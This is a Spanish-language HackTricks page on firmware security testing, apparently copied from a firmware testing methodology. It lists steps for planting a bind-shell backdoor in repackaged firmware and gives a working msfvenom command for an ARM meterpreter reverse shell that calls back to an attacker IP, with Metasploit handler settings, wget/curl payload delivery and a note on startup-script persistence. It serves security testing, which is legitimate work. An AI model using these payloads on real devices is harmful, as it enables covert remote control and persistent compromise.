<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


### Esta página fue copiada de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Intenta **subir firmware personalizado y/o binarios compilados** para buscar fallos de verificación de integridad o firma. Por ejemplo, compila un backdoor bind shell que se inicie al arrancar usando los siguientes pasos.

1. Extrae el firmware con firmware-mod-kit (FMK)
2. Identifica la arquitectura y endianness del firmware objetivo
3. Construye un compilador cruzado con Buildroot o utiliza otros métodos que se adapten a tu entorno
4. Usa el compilador cruzado para construir el backdoor
5. Copia el backdoor al firmware extraído en /usr/bin
6. Copia el binario QEMU apropiado al rootfs del firmware extraído
7. Emula el backdoor usando chroot y QEMU
8. Conéctate al backdoor vía netcat
9. Elimina el binario QEMU del rootfs del firmware extraído
10. Reempaqueta el firmware modificado con FMK
11. Prueba el firmware con backdoor emulándolo con firmware analysis toolkit (FAT) y conectándote a la IP y puerto del backdoor objetivo usando netcat

Si ya se ha obtenido una shell de root a partir del análisis dinámico, manipulación del bootloader o pruebas de seguridad de hardware, intenta ejecutar binarios maliciosos precompilados como implantes o reverse shells. Considera usar herramientas automatizadas de payload/implante para marcos de comando y control (C&C). Por ejemplo, el framework de Metasploit y 'msfvenom' se pueden aprovechar usando los siguientes pasos.

1. Identifica la arquitectura y endianness del firmware objetivo
2. Usa `msfvenom` para especificar el payload objetivo adecuado (-p), la IP del host atacante (LHOST=), el número de puerto de escucha (LPORT=) tipo de archivo (-f), arquitectura (--arch), plataforma (--platform linux o windows), y el archivo de salida (-o). Por ejemplo, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transfiere el payload al dispositivo comprometido (por ejemplo, ejecuta un servidor web local y usa wget/curl para llevar el payload al sistema de archivos) y asegúrate de que el payload tenga permisos de ejecución
4. Prepara Metasploit para manejar solicitudes entrantes. Por ejemplo, inicia Metasploit con msfconsole y usa la siguiente configuración de acuerdo con el payload anterior: use exploit/multi/handler,
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #IP del host atacante`
* `set LPORT 445 #puede ser cualquier puerto no utilizado`
* `set ExitOnSession false`
* `exploit -j -z`
5. Ejecuta el meterpreter reverse 🐚 en el dispositivo comprometido
6. Observa cómo se abren las sesiones de meterpreter
7. Realiza actividades de post-explotación

Si es posible, identifica una vulnerabilidad dentro de los scripts de inicio para obtener acceso persistente a un dispositivo a través de reinicios. Estas vulnerabilidades surgen cuando los scripts de inicio hacen referencia, [enlazan simbólicamente](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), o dependen de código ubicado en ubicaciones montadas no confiables como tarjetas SD y volúmenes flash utilizados para almacenar datos fuera de los sistemas de archivos raíz.


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
